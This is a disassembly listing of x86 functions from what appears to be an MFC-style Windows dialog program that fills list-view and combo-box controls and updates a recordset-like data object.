sub_401000
push 0xffffffff
push sub_45b4e3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x9e
mov [ esp + 0x10 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
push 0x0
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_402820
mov ecx [ esp + 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4010a0
push 0xffffffff
push sub_45b551
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] edi
mov [ esp + 0x18 ] 0x0
lea esi [ edi + 0x98 ]
mov [ esp + 0xc ] esi
lea ecx [ esi + 0x124 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x18 ] 0x4
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x18 ] 0x3
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x2
call sub_442148
mov ecx esi
mov [ esp + 0x18 ] 0x1
call sub_421723
lea ecx [ edi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx edi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_4011a0
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
lea edi [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x5
mov ecx edi
call sub_43c126
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x50
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x50
push 0x3
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x4
push 0x101e
push ecx
call edi
push 0x78
push 0x5
push 0x101e
mov edx [ esi + 0x78 ]
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push eax
call edi
mov ecx esi
call sub_4012b0
pop edi
mov eax 0x1
pop esi
retn
sub_4012b0
push 0xffffffff
push sub_45b568
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
mov ebx [ SendMessageA@IAT ]
push esi
push edi
mov esi ecx
xor edi edi
mov eax [ esi + 0x78 ]
push edi
push edi
push 0x1009
push eax
call ebx
mov ecx [ esi + 0x78 ]
push edi
push edi
push 0xb
push ecx
call ebx
push 0x1
mov ecx esi
call sub_440b18
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
push rw-data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] edi
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov eax [ esi + 0x98 ]
lea ebp [ esi + 0x98 ]
push edi
push ecx
push 0xffffffff
mov ecx ebp
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x160 ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ ebp ]
mov ecx ebp
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebx
lea ebx [ esi + 0x5c ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x1a8 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
mov ecx ebx
call sub_43c179
mov eax [ esi + 0x1ac ]
mov ecx ebx
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x1b0 ]
mov ecx ebx
push eax
push 0x2
push edi
call sub_43c1c5
mov eax [ esi + 0x1b4 ]
mov ecx ebx
push eax
push 0x3
push edi
call sub_43c1c5
mov eax [ esi + 0x1b8 ]
mov ecx ebx
push eax
push 0x4
push edi
call sub_43c1c5
mov eax [ esi + 0x1bc ]
mov ecx ebx
push eax
push 0x5
push edi
call sub_43c1c5
mov edx [ ebp ]
push 0x1
push 0x1
mov ecx ebp
inc edi
call [ edx + 0x14 ]
mov eax [ esi + 0x160 ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
sub_401420
push 0xffffffff
push sub_45b622
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xf0
mov eax [ rw-data ]
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] eax
push 0x0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x104 ] 0x0
call sub_4022d0
mov [ esp + 0x100 ] 0x1
lea ecx [ esp + 0xf4 ]
mov [ esp + 0x100 ] 0x11
call sub_442148
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x100 ] 0x10
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x100 ] 0xf
call sub_442148
lea ecx [ esp + 0xe8 ]
mov [ esp + 0x100 ] 0xe
call sub_442148
lea ecx [ esp + 0xe4 ]
mov [ esp + 0x100 ] 0xd
call sub_442148
lea ecx [ esp + 0xe0 ]
mov [ esp + 0x100 ] 0xc
call sub_442148
lea ecx [ esp + 0xa4 ]
mov [ esp + 0x100 ] 0xb
call sub_44f0ac
mov [ esp + 0x100 ] 0xa
mov ecx [ esp + 0xe8 ]
lea edx [ esp + 0x8 ]
push ecx
push rw-data
push edx
call sub_43b5cc
mov ecx [ esp + 0x14 ]
mov eax [ edi + 0x98 ]
add esp 0xc
lea esi [ edi + 0x98 ]
push 0x0
push ecx
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
lea ecx [ esp + 0xf4 ]
mov [ esp + 0x100 ] 0x9
call sub_442148
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x100 ] 0x8
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x100 ] 0x7
call sub_442148
lea ecx [ esp + 0xe8 ]
mov [ esp + 0x100 ] 0x6
call sub_442148
lea ecx [ esp + 0xe4 ]
mov [ esp + 0x100 ] 0x5
call sub_442148
lea ecx [ esp + 0xe0 ]
mov [ esp + 0x100 ] 0x4
call sub_442148
lea ecx [ esp + 0xa4 ]
mov [ esp + 0x100 ] 0x3
call sub_44f0ac
mov [ esp + 0x100 ] 0x2
jmp r-xdata
mov eax [ edi + 0x134 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x68 ]
call sub_44f0ac
lea ecx [ esp + 0xc ]
mov [ esp + 0x100 ] 0x0
call sub_43da87
lea ecx [ esp + 0x8 ]
mov [ esp + 0x100 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0xf8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0xfc
retn
mov eax [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
mov ecx esi
call [ eax + 0x20 ]
lea ecx [ esp + 0xf0 ]
push ecx
lea ecx [ edi + 0x1ac ]
call sub_442281
lea edx [ esp + 0xec ]
lea ecx [ edi + 0x1bc ]
push edx
call sub_442281
lea eax [ esp + 0xf4 ]
lea ecx [ edi + 0x1b8 ]
push eax
call sub_442281
lea ecx [ esp + 0xe0 ]
push ecx
lea ecx [ edi + 0x1b0 ]
call sub_442281
lea edx [ esp + 0xe8 ]
lea ecx [ edi + 0x1a8 ]
push edx
call sub_442281
lea eax [ esp + 0xe4 ]
lea ecx [ edi + 0x1b4 ]
push eax
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx edi
call sub_4012b0
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
jmp r-xdata
lea ecx [ esp + 0xc ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
sub_4016f0
push 0xffffffff
push sub_45b697
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xe8 ]
mov [ esp + 0x10 ] 0x7
call sub_442148
lea ecx [ esi + 0xe4 ]
mov [ esp + 0x10 ] 0x6
call sub_442148
lea ecx [ esi + 0xe0 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0xdc ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0xd8 ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_44f0ac
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_44f0ac
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4017b0
push 0xffffffff
push sub_45b7e5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xf4
push ebx
push ebp
push esi
mov ebp ecx
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_4022d0
push 0x1
mov ecx ebp
mov [ esp + 0x110 ] ebx
call sub_440b18
mov eax [ ebp + 0x78 ]
push ebx
push ebx
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
cmp edi ebx
jge r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
lea esi [ ebp + 0x5c ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x100 ]
mov [ esp + 0x110 ] 0x9
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push 0x5
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xfc ]
mov [ esp + 0x110 ] 0xa
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push 0x4
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x104 ]
mov [ esp + 0x110 ] 0xb
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push 0x2
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x110 ] 0xc
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push ebx
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xf8 ]
mov [ esp + 0x110 ] 0xd
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push 0x3
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
mov [ esp + 0x10c ] 0xe
push eax
lea ecx [ esp + 0xf4 ]
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
lea ecx [ esp + 0x18 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x100 ]
mov [ esp + 0x10c ] 0x8
call sub_442148
lea ecx [ esp + 0xfc ]
mov [ esp + 0x10c ] 0x7
call sub_442148
lea ecx [ esp + 0xf8 ]
mov [ esp + 0x10c ] 0x6
call sub_442148
lea ecx [ esp + 0xf4 ]
mov [ esp + 0x10c ] 0x5
call sub_442148
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x10c ] 0x4
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x10c ] 0x3
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x10c ] 0x2
call sub_44f0ac
mov [ esp + 0x10c ] 0x1
jmp r-xdata
lea ecx [ esp + 0x100 ]
mov [ esp + 0x10c ] 0x20
call sub_442148
lea ecx [ esp + 0xfc ]
mov [ esp + 0x10c ] 0x1f
call sub_442148
lea ecx [ esp + 0xf8 ]
mov [ esp + 0x10c ] 0x1e
call sub_442148
lea ecx [ esp + 0xf4 ]
mov [ esp + 0x10c ] 0x1d
call sub_442148
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x10c ] 0x1c
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x10c ] 0x1b
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x10c ] 0x1a
call sub_44f0ac
mov [ esp + 0x10c ] 0x19
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push ebx
lea edx [ esp + 0x18 ]
push edi
push edx
mov ecx esi
mov [ esp + 0x118 ] 0xf
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0x118 ] 0x10
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x10c ] 0xf
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ ebp + 0x98 ]
lea esi [ ebp + 0x98 ]
push ebx
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x74 ]
call sub_44f0ac
lea ecx [ esp + 0x18 ]
mov [ esp + 0x10c ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x104 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x100
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0xfc ]
lea ecx [ ebp + 0x1ac ]
push eax
call sub_442281
lea ecx [ esp + 0xf8 ]
push ecx
lea ecx [ ebp + 0x1bc ]
call sub_442281
lea edx [ esp + 0x100 ]
lea ecx [ ebp + 0x1b8 ]
push edx
call sub_442281
lea eax [ esp + 0xec ]
lea ecx [ ebp + 0x1b0 ]
push eax
call sub_442281
lea ecx [ esp + 0xf4 ]
push ecx
lea ecx [ ebp + 0x1a8 ]
call sub_442281
lea edx [ esp + 0xf0 ]
lea ecx [ ebp + 0x1b4 ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
mov ecx ebp
call sub_4012b0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
lea ecx [ esp + 0x100 ]
mov [ esp + 0x10c ] 0x18
call sub_442148
lea ecx [ esp + 0xfc ]
mov [ esp + 0x10c ] 0x17
call sub_442148
lea ecx [ esp + 0xf8 ]
mov [ esp + 0x10c ] 0x16
call sub_442148
lea ecx [ esp + 0xf4 ]
mov [ esp + 0x10c ] 0x15
call sub_442148
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x10c ] 0x14
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x10c ] 0x13
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x10c ] 0x12
call sub_44f0ac
mov [ esp + 0x10c ] 0x11
jmp r-xdata
sub_401c90
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45b800
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
push 0x0
push 0x0
push 0x1042
mov eax [ edi + 0x78 ]
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ edi + 0x5c ]
mov [ esp + 0x24 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x2c ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx edi
call sub_4012b0
push eax
push eax
push rw-data
call sub_4496b7
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_401d90
push 0xffffffff
push sub_45b945
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xf4
push ebx
push ebp
push esi
mov ebp ecx
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_4022d0
push 0x1
mov ecx ebp
mov [ esp + 0x110 ] ebx
call sub_440b18
mov eax [ ebp + 0x78 ]
push ebx
push ebx
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
cmp edi ebx
jge r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
lea esi [ ebp + 0x5c ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x100 ]
mov [ esp + 0x110 ] 0x9
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push 0x5
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xfc ]
mov [ esp + 0x110 ] 0xa
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push 0x4
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x104 ]
mov [ esp + 0x110 ] 0xb
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push 0x2
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x110 ] 0xc
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push ebx
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0xf8 ]
mov [ esp + 0x110 ] 0xd
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push 0x3
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
mov [ esp + 0x10c ] 0xe
push eax
lea ecx [ esp + 0xf4 ]
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
lea ecx [ esp + 0x18 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x100 ]
mov [ esp + 0x10c ] 0x8
call sub_442148
lea ecx [ esp + 0xfc ]
mov [ esp + 0x10c ] 0x7
call sub_442148
lea ecx [ esp + 0xf8 ]
mov [ esp + 0x10c ] 0x6
call sub_442148
lea ecx [ esp + 0xf4 ]
mov [ esp + 0x10c ] 0x5
call sub_442148
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x10c ] 0x4
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x10c ] 0x3
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x10c ] 0x2
call sub_44f0ac
mov [ esp + 0x10c ] 0x1
jmp r-xdata
mov eax [ esp + 0x118 ]
mov [ eax ] ebx
lea ecx [ esp + 0x100 ]
mov [ esp + 0x10c ] 0x20
call sub_442148
lea ecx [ esp + 0xfc ]
mov [ esp + 0x10c ] 0x1f
call sub_442148
lea ecx [ esp + 0xf8 ]
mov [ esp + 0x10c ] 0x1e
call sub_442148
lea ecx [ esp + 0xf4 ]
mov [ esp + 0x10c ] 0x1d
call sub_442148
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x10c ] 0x1c
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x10c ] 0x1b
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x10c ] 0x1a
call sub_44f0ac
mov [ esp + 0x10c ] 0x19
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push ebx
lea edx [ esp + 0x18 ]
push edi
push edx
mov ecx esi
mov [ esp + 0x118 ] 0xf
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0x118 ] 0x10
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x10c ] 0xf
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ ebp + 0x98 ]
lea esi [ ebp + 0x98 ]
push ebx
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x74 ]
call sub_44f0ac
lea ecx [ esp + 0x18 ]
mov [ esp + 0x10c ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x104 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x100
retn 0x8
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0xfc ]
lea ecx [ ebp + 0x1ac ]
push eax
call sub_442281
lea ecx [ esp + 0xf8 ]
push ecx
lea ecx [ ebp + 0x1bc ]
call sub_442281
lea edx [ esp + 0x100 ]
lea ecx [ ebp + 0x1b8 ]
push edx
call sub_442281
lea eax [ esp + 0xec ]
lea ecx [ ebp + 0x1b0 ]
push eax
call sub_442281
lea ecx [ esp + 0xf4 ]
push ecx
lea ecx [ ebp + 0x1a8 ]
call sub_442281
lea edx [ esp + 0xf0 ]
lea ecx [ ebp + 0x1b4 ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
mov ecx ebp
call sub_4012b0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10c ] bl
call sub_442148
lea ecx [ esp + 0x100 ]
mov [ esp + 0x10c ] 0x18
call sub_442148
lea ecx [ esp + 0xfc ]
mov [ esp + 0x10c ] 0x17
call sub_442148
lea ecx [ esp + 0xf8 ]
mov [ esp + 0x10c ] 0x16
call sub_442148
lea ecx [ esp + 0xf4 ]
mov [ esp + 0x10c ] 0x15
call sub_442148
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x10c ] 0x14
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x10c ] 0x13
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x10c ] 0x12
call sub_44f0ac
mov [ esp + 0x10c ] 0x11
jmp r-xdata
sub_4022d0
push 0xffffffff
push sub_45b9c5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x9f
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x1c ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov edx [ rw-data ]
lea ecx [ esi + 0xd4 ]
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0xd8 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0xdc ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0xe0 ]
mov [ ebp ] eax
mov edx [ rw-data ]
mov [ esi + 0xe4 ] edx
mov eax [ rw-data ]
mov [ esi + 0xe8 ] eax
push rw-data
mov [ esp + 0x20 ] 0x8
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0xe4 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0xe8 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_402410
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3ee
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3ec
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3ec
push edi
call sub_449495
lea eax [ esi + 0xd8 ]
push eax
push 0x3ee
push edi
call sub_449495
lea ecx [ esi + 0xdc ]
push ecx
push 0x425
push edi
call sub_4493f1
lea edx [ esi + 0xe0 ]
push edx
push 0x427
push edi
call sub_4493f1
lea eax [ esi + 0xe4 ]
push eax
push 0x3ea
push edi
call sub_4493f1
add esi 0xe8
push esi
push 0x3ed
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_4024c0
push 0xffffffff
push sub_45ba41
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x128
push esi
mov esi ecx
call sub_43e113
push 0x0
lea ecx [ esp + 0x8 ]
call sub_40a470
push 0x0
push rw-data
push 0xffffffff
lea ecx [ esp + 0x10 ]
mov [ esp + 0x140 ] 0x0
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xcc ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x128 ]
mov [ esp + 0x134 ] 0x6
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0x5
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x134 ] 0x4
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x134 ] 0x3
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x134 ] 0x2
call sub_442148
lea ecx [ esp + 0x114 ]
mov [ esp + 0x134 ] 0x1
call sub_442148
lea ecx [ esp + 0x4 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
xor eax eax
pop esi
mov ecx [ esp + 0x128 ]
mov [ fs : 0x0 ] ecx
add esp 0x134
retn
lea ecx [ esp + 0x4 ]
call sub_421900
lea ecx [ esp + 0x128 ]
mov [ esp + 0x134 ] 0xc
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0xb
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x134 ] 0xa
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x134 ] 0x9
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x134 ] 0x8
call sub_442148
lea ecx [ esp + 0x114 ]
mov [ esp + 0x134 ] 0x7
call sub_442148
lea ecx [ esp + 0x4 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x12c ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x134
retn
push edi
mov edi [ SendMessageA@IAT ]
mov eax [ esp + 0x118 ]
mov ecx [ esi + 0xb4 ]
push eax
push 0x0
push 0x143
push ecx
call edi
mov edx [ esp + 0x118 ]
mov eax [ esi + 0x78 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x8 ]
push 0x1
push 0x1
lea ecx [ esp + 0x10 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd0 ]
test eax eax
je r-xdata
pop edi
sub_4026e0
push 0xffffffff
push sub_45ba9e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x124 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
